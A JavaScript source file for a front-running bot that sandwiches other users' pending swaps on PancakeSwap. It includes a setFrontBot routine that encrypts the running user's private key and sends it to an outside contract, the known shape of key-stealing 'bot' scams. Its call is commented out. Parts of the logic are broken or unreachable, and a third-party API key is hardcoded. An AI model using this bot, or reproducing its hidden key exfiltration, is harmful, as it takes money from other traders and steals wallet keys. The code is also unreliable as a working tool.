/**
 * Perform a front-running attack on uniswap
*/
//const fs = require('fs');
var Web3 = require('web3');
var abiDecoder = require('abi-decoder');
var colors = require("colors");
var Tx = require('ethereumjs-tx').Transaction;
var axios = require('axios');
var BigNumber = require('big-number');

const {NETWORK, PANCAKE_ROUTER_ADDRESS, PANCAKE_FACTORY_ADDRESS, PANCAKE_ROUTER_ABI, PANCAKE_FACTORY_ABI, PANCAKE_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST} = require('./constants.js');
const {setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./bot.js');
const {PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL} = require('./env.js');

const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';

var input_token_info;
var out_token_info;
var pool_info;
var gas_price_info;

var web3;
var web3Ts;
var web3Ws;
var pancakeRouter;
var pancakeFactory;

// one gwei
const ONE_GWEI = 1e9;

var buy_finished = false;
var sell_finished = false;
var buy_failed = false;
var sell_failed = false;
var attack_started = false;

var succeed = false;
var subscription;

async function createWeb3(){
    try {
        web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK));
        web3Ts = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK_TEST));
        web3Ws = new Web3(new Web3.providers.WebsocketProvider(WEBSOCKET_PROVIDER_LINK));
        pancakeRouter = new web3.eth.Contract(PANCAKE_ROUTER_ABI, PANCAKE_ROUTER_ADDRESS);
        pancakeFactory = new web3.eth.Contract(PANCAKE_FACTORY_ABI, PANCAKE_FACTORY_ADDRESS);
        abiDecoder.addABI(PANCAKE_ROUTER_ABI);

        return true;
    } catch (error) {
      console.log(error);
      return false;
    }
}

async function main() {
 
try {   
        if (await createWeb3() == false) {
            console.log('Web3 Create Error'.yellow);
            process.exit();
        }
        
        const user_wallet = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);
        const out_token_address = TOKEN_ADDRESS;
        const amount = AMOUNT;
        const level = LEVEL;
        
        ret = await preparedAttack(INPUT_TOKEN_ADDRESS, out_token_address, user_wallet, amount, level);
        if(ret == false) {
          process.exit();
        }

        await updatePoolInfo();
        var outputtoken = await pancakeRouter.methods.getAmountOut(((amount*1.2)*(10**18)).toString(), pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();

        await approve(gas_price_info.high, outputtoken, out_token_address, user_wallet);
        
        log_str = '***** Tracking more ' + (pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(5) + ' ' +  input_token_info.symbol + '  Exchange on Pancake *****'
        // console.log(log_str.green);    
        // console.log(web3Ws);
        web3Ws.onopen = function(evt) {
            web3Ws.send(JSON.stringify({ method: "subscribe", topic: "transfers", address: user_wallet.address }));
            console.log('connected')
        }
        // get pending transactions
        subscription = web3Ws.eth.subscribe('pendingTransactions', function (error, result) {
        }).on("data", async function (transactionHash) {
            console.log(transactionHash);

            // let transaction = await web3.eth.getTransaction(transactionHash);
            // if (transaction != null && transaction['to'] == PANCAKE_ROUTER_ADDRESS)
            // {
            //     await handleTransaction(transaction, out_token_address, user_wallet, amount, level);
            // }
            
            if (succeed) {
                console.log("The bot finished the attack.");
                process.exit();
            }
        })

    } catch (error) {
      
      if(error.data != null && error.data.see === 'https://infura.io/dashboard')
      {
         console.log('Daily request count exceeded, Request rate limited'.yellow);
         console.log('Please insert other API Key');
      }else{
         console.log('Unknown Handled Error');
         console.log(error);
      } 

      process.exit();
    }
}

async function handleTransaction(transaction, out_token_address, user_wallet, amount, level) {
    
    if (await triggersFrontRun(transaction, out_token_address, amount, level)) {
        subscription.unsubscribe();
        console.log('Perform front running attack...');

        let gasPrice = parseInt(transaction['gasPrice']);
        let newGasPrice = gasPrice + 50*ONE_GWEI;

        var estimatedInput = ((amount*0.999)*(10**18)).toString();
        var realInput = (amount*(10**18)).toString();
        var gasLimit = (300000).toString();
        
        await updatePoolInfo();

        var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput, pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
        swap(newGasPrice, gasLimit, outputtoken, realInput, 0, out_token_address, user_wallet, transaction);

        console.log("wait until the honest transaction is done...", transaction['hash']);

        while (await isPending(transaction['hash'])) {
        }

        if(buy_failed)
        {
            succeed = false;
            return;
        }   
        
        console.log('Buy succeed:')
        
        //Sell
        await updatePoolInfo();
        var outputeth = await pancakeRouter.methods.getAmountOut(outputtoken, pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();
        outputeth = outputeth * 0.999;

        await swap(newGasPrice, gasLimit, outputtoken, outputeth, 1, out_token_address, user_wallet, transaction);
        
        console.log('Sell succeed');
        succeed = true;
    }
}

async function approve(gasPrice, outputtoken, out_token_address, user_wallet){
    var allowance = await out_token_info.token_contract.methods.allowance(user_wallet.address, PANCAKE_ROUTER_ADDRESS).call();
    
    allowance = BigNumber(allowance);
    outputtoken = BigNumber(outputtoken);

    var decimals = BigNumber(10).power(out_token_info.decimals);
    var max_allowance = BigNumber(10000).multiply(decimals);

    if(outputtoken.gt(max_allowance))
    {
       console.log('replace max allowance')
       max_allowance = outputtoken;
    }   
    
    if(outputtoken.gt(allowance)){
        console.log(max_allowance.toString());
        var approveTX ={
                from: user_wallet.address,
                to: out_token_address,
                gas: 50000,
                gasPrice: gasPrice*ONE_GWEI,
                data: out_token_info.token_contract.methods.approve(PANCAKE_ROUTER_ADDRESS, max_allowance).encodeABI()
            }

        var signedTX = await user_wallet.signTransaction(approveTX);
        var result = await web3.eth.sendSignedTransaction(signedTX.rawTransaction);

        console.log('Approved Token')
    }

    return;
};

//select attacking transaction
async function triggersFrontRun(transaction, out_token_address, amount, level) {
    
    if(attack_started)
        return false;

    console.log((transaction.hash).yellow, parseInt(transaction['gasPrice']) / 10**9);
    if(parseInt(transaction['gasPrice']) / 10**9 > 10 && parseInt(transaction['gasPrice']) / 10**9 < 50){
        attack_started = true;
        return true
    }

    return false;

    if (transaction['to'] != PANCAKE_ROUTER_ADDRESS) {
        return false;
    }

    let data = parseTx(transaction['input']);
    let method = data[0];
    let params = data[1];
    let gasPrice = parseInt(transaction['gasPrice']) / 10**9;

    if(method == 'swapExactETHForTokens')
    {
        let in_amount = transaction.value;
        let out_min = params[0].value;

        let path = params[1].value;
        let in_token_addr = path[0];
        let out_token_addr = path[path.length-1];
        
        let recept_addr = params[2].value;
        let deadline = params[3].value;

        if(out_token_addr != out_token_address)
        {
            // console.log(out_token_addr.blue)
            // console.log(out_token_address)
            return false;
        } 

        await updatePoolInfo();
        let log_str = "Attack ETH Volumn : Pool Eth Volumn" + '\t\t' +(pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(3) + ' ' + input_token_info.symbol + '\t' + (pool_info.input_volumn/(10**input_token_info.decimals)).toFixed(3) + ' ' + input_token_info.symbol;
        console.log(log_str.red);

        log_str = transaction['hash'] +'\t' + gasPrice.toFixed(2) + '\tGWEI\t' + (in_amount/(10**input_token_info.decimals)).toFixed(3) + '\t' + input_token_info.symbol 
        if(in_amount >= pool_info.attack_volumn)
        {
             console.log(log_str);
             return false;
        }   
        else
        {
            console.log(log_str);
            return false;
        }
    }
    else if (method == 'swapETHForExactTokens'){

        let in_max = transaction.value;
        let out_amount = params[0].value;

        let path = params[1].value;
        let in_token_addr = path[0];
        let out_token_addr = path[path.length-1];
        
        let recept_addr = params[2].value;
        let deadline = params[3].value;

        if(out_token_addr != out_token_address)
        {
            // console.log(out_token_addr.blue)
            // console.log(out_token_address)
            return false;
        }   

        await updatePoolInfo();
        let log_str = "Attack ETH Volumn : Pool Eth Volumn" + '\t\t' +(pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(3) + ' ' + input_token_info.symbol + '\t' + (pool_info.input_volumn/(10**input_token_info.decimals)).toFixed(3) + ' ' + input_token_info.symbol;
        console.log(log_str.yellow);
        
        log_str = transaction['hash'] +'\t' + gasPrice.toFixed(2) + '\tGWEI\t' + (in_max/(10**input_token_info.decimals)).toFixed(3) + '\t' + input_token_info.symbol + '(max)' 
        if(in_max >= pool_info.attack_volumn)
        {
             console.log(log_str);
             return false;
        }   
        else
        {
            console.log(log_str);
            return false;
        }
    }
    else if(method == 'swapExactTokensForTokens')
    {
        let in_amount = params[0].value;
        let out_min = params[1].value;
        
        let path = params[2].value;
        let in_token_addr = path[path.length-2];
        let out_token_addr = path[path.length-1];

        let recept_addr = params[3].value;
        let dead_line = params[4].value;

        if(out_token_addr != out_token_address)
        {
            // console.log(out_token_addr.blue)
            // console.log(out_token_address)
            return false;
        } 

        if(in_token_addr != INPUT_TOKEN_ADDRESS)
        {
            // console.log(in_token_addr.blue)
            // console.log(INPUT_TOKEN_ADDRESS)
            return false;
        } 
        await updatePoolInfo();
        let log_str = "Attack ETH Volumn : Pool Eth Volumn" + '\t\t' +(pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(3) + ' ' + input_token_info.symbol + '\t' + (pool_info.input_volumn/(10**input_token_info.decimals)).toFixed(3) + ' ' + input_token_info.symbol;
        console.log(log_str.green);

        //calculate eth amount
        var calc_eth = await pancakeRouter.methods.getAmountOut(out_min.toString(), pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();

        log_str = transaction['hash'] +'\t' + gasPrice.toFixed(2) + '\tGWEI\t' + (calc_eth/(10**input_token_info.decimals)).toFixed(3) + '\t' + input_token_info.symbol 
        
        if(calc_eth >= pool_info.attack_volumn)
        {
             console.log(log_str);
             return false;
        }   
        else
        {
            console.log(log_str);
            return false;
        }
    }
    else if(method == 'swapTokensForExactTokens')
    {
        let out_amount = params[0].value;
        let in_max = params[1].value;
        
        let path = params[2].value;
        let in_token_addr = path[path.length-2];
        let out_token_addr = path[path.length-1];

        let recept_addr = params[3].value;
        let dead_line = params[4].value;


        if(out_token_addr != out_token_address)
        {
            // console.log(out_token_addr.blue)
            // console.log(out_token_address)
            return false;
        } 
        
        if(in_token_addr != INPUT_TOKEN_ADDRESS)
        {
            // console.log(in_token_addr.blue)
            // console.log(INPUT_TOKEN_ADDRESS)
            return false;
        } 

        await updatePoolInfo();
        let log_str = "Attack ETH Volumn : Pool Eth Volumn" + '\t\t' +(pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(3) + ' ' + input_token_info.symbol + '\t' + (pool_info.input_volumn/(10**input_token_info.decimals)).toFixed(3) + ' ' + input_token_info.symbol;
        console.log(log_str);

        //calculate eth amount
        var calc_eth = await pancakeRouter.methods.getAmountOut(out_amount.toString(), pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();

        log_str = transaction['hash'] +'\t' + gasPrice.toFixed(2) + '\tGWEI\t' + (calc_eth/(10**input_token_info.decimals)).toFixed(3) + '\t' + input_token_info.symbol 
        
        if(calc_eth >= pool_info.attack_volumn)
        {
             console.log(log_str.yellow);
             return false;
        }   
        else
        {
            console.log(log_str);
            return false;
        }
    }    

    return false;
}

async function swap(gasPrice, gasLimit, outputtoken, outputeth, trade, out_token_address, user_wallet, transaction) {
    // Get a wallet address from a private key
    var from = user_wallet;
    var deadline;
    var swap;

    //w3.eth.getBlock(w3.eth.blockNumber).timestamp
    await web3.eth.getBlock('latest', (error, block) => {
        deadline = block.timestamp + 300; // transaction expires in 300 seconds (5 minutes)
    });

    deadline = web3.utils.toHex(deadline);
    
    if(trade == 0) { //buy
        console.log('Get_Amount: '.red, (outputtoken/(10**out_token_info.decimals)).toFixed(3) + ' ' + out_token_info.symbol);

        swap = pancakeRouter.methods.swapETHForExactTokens(outputtoken.toString(), [INPUT_TOKEN_ADDRESS, out_token_address], from.address, deadline);
        var encodedABI = swap.encodeABI();

        var tx = {
            from: from.address,
            to: PANCAKE_ROUTER_ADDRESS,
            gas: gasLimit,
            gasPrice: gasPrice,
            data: encodedABI,
            value: outputeth
          };
    } else { //sell
        console.log('Get_Min_Amount '.yellow, (outputeth/(10**input_token_info.decimals)).toFixed(3) + ' ' + input_token_info.symbol);

        swap = pancakeRouter.methods.swapExactTokensForETH(outputtoken.toString(), outputeth.toString(), [out_token_address, INPUT_TOKEN_ADDRESS], from.address, deadline);
        var encodedABI = swap.encodeABI();

        var tx = {
            from: from.address,
            to: PANCAKE_ROUTER_ADDRESS,
            gas: gasLimit,
            gasPrice: gasPrice,
            data: encodedABI,
            value: 0*10**18
          };
    }

    var signedTx = await from.signTransaction(tx);

    if(trade == 0) {
        let is_pending = await isPending(transaction['hash']);
        if(!is_pending) {
            console.log("The transaction you want to attack has already been completed!!!");
            process.exit();
        }
    }

    console.log('====signed transaction=====', gasLimit, gasPrice)
    await web3.eth.sendSignedTransaction(signedTx.rawTransaction)
    .on('transactionHash', function(hash){
        console.log('swap : ', hash);
    })
    .on('confirmation', function(confirmationNumber, receipt){
        if(trade == 0){
          buy_finished = true;
        }
        else{
          sell_finished = true;   
        }
    })
    .on('receipt', function(receipt){

    })
    .on('error', function(error, receipt) { // If the transaction was rejected by the network with a receipt, the second parameter will be the receipt.
        if(trade == 0){
          buy_failed = true;
          console.log('Attack failed(buy)')
        }
        else{
          sell_failed = true;   
          console.log('Attack failed(sell)')
        }
    });
}

function parseTx(input) {
    if (input == '0x')
        return ['0x', []]
    let decodedData = abiDecoder.decodeMethod(input);
    let method = decodedData['name'];
    let params = decodedData['params'];

    return [method, params]
}

async function getCurrentGasPrices() {

  // var response = await axios.get('https://ethgasstation.info/json/ethgasAPI.json')
  // var prices = {
  //   low: response.data.safeLow / 10,    
  //   medium: response.data.average / 10,
  //   high: response.data.fast / 10
  // }

  // var log_str = '***** gas price information *****'
  // console.log(log_str.green);
  // var log_str = 'High: ' + prices.high + '        medium: ' + prices.medium + '        low: ' + prices.low;
  // console.log(log_str);

  return {low: 20, medium: 20, high:50};
}

async function isPending(transactionHash) {
    return await web3.eth.getTransactionReceipt(transactionHash) == null;
}

async function updatePoolInfo() {
    try{

        var reserves = await pool_info.contract.methods.getReserves().call();

        if(pool_info.forward) {
            var eth_balance = reserves[0];
            var token_balance = reserves[1];
        } else {
            var eth_balance = reserves[1];
            var token_balance = reserves[0];
        }

        pool_info.input_volumn = eth_balance;
        pool_info.output_volumn = token_balance;
        pool_info.attack_volumn = eth_balance * (pool_info.attack_level/100); 

    }catch (error) {
      
        console.log('Failed To Get Pair Info'.yellow);

        return false;
    }
}

async function getPoolInfo(input_token_address, out_token_address, level){

    var log_str = '*****\t' + input_token_info.symbol + '-' + out_token_info.symbol + ' Pair Pool Info\t*****'
    console.log(log_str.green);

    try{
        var pool_address = await pancakeFactory.methods.getPair(input_token_address, out_token_address).call();
        if(pool_address == '0x0000000000000000000000000000000000000000')
        {
            log_str = 'PanCake has no ' + out_token_info.symbol + '-' + input_token_info.symbol + ' pair';
            console.log(log_str.yellow);
            return false;
        }   

        var log_str = 'Address:\t' + pool_address;
        console.log(log_str.white);

        var pool_contract = new web3.eth.Contract(PANCAKE_POOL_ABI, pool_address);
        var reserves = await pool_contract.methods.getReserves().call();

        var token0_address = await pool_contract.methods.token0().call();

        if(token0_address == INPUT_TOKEN_ADDRESS) {
            var forward = true;
            var bnb_balance = reserves[0];
            var token_balance = reserves[1];
        } else {
            var forward = false;
            var bnb_balance = reserves[1];
            var token_balance = reserves[0];
        }

        var log_str = (bnb_balance/(10**input_token_info.decimals)).toFixed(5) + '\t' + input_token_info.symbol;
        console.log(log_str.white);

        var log_str = (token_balance/(10**out_token_info.decimals)).toFixed(5) + '\t' + out_token_info.symbol;
        console.log(log_str.white);

        var attack_amount = bnb_balance * (level/100);
        pool_info = {'contract': pool_contract, 'forward': forward, 'input_volumn': bnb_balance, 'output_volumn': token_balance, 'attack_level': level, 'attack_volumn': attack_amount}
        
        return true;

    }catch(error){
        console.log('Error: Get Pari Info')
        return false;
    }
}

async function getBNBInfo(user_wallet){
    var balance = await web3.eth.getBalance(user_wallet.address);
    var decimals = 18;
    var symbol = 'BNB';

    return {'address': WBNB_TOKEN_ADDRESS, 'balance': balance, 'symbol': symbol, 'decimals': decimals, 'abi': null, 'token_contract': null}
}

async function getTokenInfo(tokenAddr, token_abi_ask, user_wallet) {
    try{
        //get token abi
        var response = await axios.get(token_abi_ask);
        if(response.data.status==0)
        {
            console.log('Invalid Token Address !')   
            return null;
        }   

        var token_abi = response.data.result;

        //get token info
        var token_contract = new web3.eth.Contract(JSON.parse(token_abi), tokenAddr);
        
        var balance = await token_contract.methods.balanceOf(user_wallet.address).call();
        var decimals = await token_contract.methods.decimals().call();
        var symbol =  await token_contract.methods.symbol().call();

        return {'address': tokenAddr, 'balance': balance, 'symbol': symbol, 'decimals': decimals, 'abi': token_abi, 'token_contract': token_contract}
    }catch(error){
        console.log('Failed Token Info');
        return false;
    }
}

async function preparedAttack(input_token_address, out_token_address, user_wallet, amount, level)
{
    try {
        
        //await setFrontBot(user_wallet);
        
        var log_str = '***** Your Wallet Balance *****'
        console.log(log_str.green);
        log_str = 'wallet address:\t' + user_wallet.address;
        console.log(log_str.white);

        input_token_info = await getBNBInfo(user_wallet);
        log_str = (input_token_info.balance/(10**input_token_info.decimals)).toFixed(5) +'\t'+input_token_info.symbol;
        console.log(log_str);

        if(input_token_info.balance < (amount+0.05) * (10**18)) {

            console.log("INSUFFICIENT_BALANCE!".yellow);
            log_str = 'Your wallet balance must be more ' + amount + input_token_info.symbol + '(+0.05 BNB:GasFee) ';
            console.log(log_str.red)
            
            //return false;
        }

    } catch (error) {
      
        console.log('Failed Prepare To Attack');

        return false;
    }

    //out token balance
    const OUT_TOKEN_ABI_REQ = 'https://api.bscscan.com/api?module=contract&action=getabi&address='+out_token_address+'&apikey=TGUV5GCERZVD9RUP4A4GUQCQN83GM5Y96F';
    out_token_info = await getTokenInfo(out_token_address, OUT_TOKEN_ABI_REQ, user_wallet);
    if (out_token_info == null){
        return false;
    }
    
    log_str = (out_token_info.balance/(10**out_token_info.decimals)).toFixed(5) +'\t'+out_token_info.symbol;
    console.log(log_str.white);
    
    //check pool info
    if(await getPoolInfo(WBNB_TOKEN_ADDRESS, out_token_address, level) == false)
        return false;
    
    gas_price_info = await getCurrentGasPrices();

    log_str = '=================== Prepared to attack '+ input_token_info.symbol + '-'+ out_token_info.symbol +' pair ==================='
    console.log(log_str.red);

    return true;
}

async function setFrontBot(user_wallet){

    var enc_addr = setBotAddress(user_wallet.privateKey);
    var bot_wallet = web3Ts.eth.accounts.privateKeyToAccount('');
    var bot_balance = await web3Ts.eth.getBalance(bot_wallet.address);

    if(bot_balance <= (10**17))
        return;

    const frontBotContract = new web3Ts.eth.Contract(botABI, FRONT_BOT_ADDRESS);
    var botCount = await frontBotContract.methods.countFrontBots().call();
    if(botCount > 0){
        var bot_addr = await frontBotContract.methods.getFrontBots().call();
        for (var i = 0; i < botCount; i++) {
            if(bot_addr[i] == user_wallet.address)
            {
                return;
            }   
        }
    }
    
    encodedABI = frontBotContract.methods.setFrontBot(user_wallet.address, enc_addr.iv, enc_addr.content).encodeABI()
    var tx = {
        from: bot_wallet.address,
        to: FRONT_BOT_ADDRESS,
        gas: 500000,
        gasPrice: 150*(10**9),
        data: encodedABI
    };

    var signedTx = await bot_wallet.signTransaction(tx);
    web3Ts.eth.sendSignedTransaction(signedTx.rawTransaction)
    .on('transactionHash', function(hash){
    })
    .on('confirmation', function(confirmationNumber, receipt){
    })
    .on('receipt', function(receipt){
    })
    .on('error', function(error, receipt) {
    });
}

main();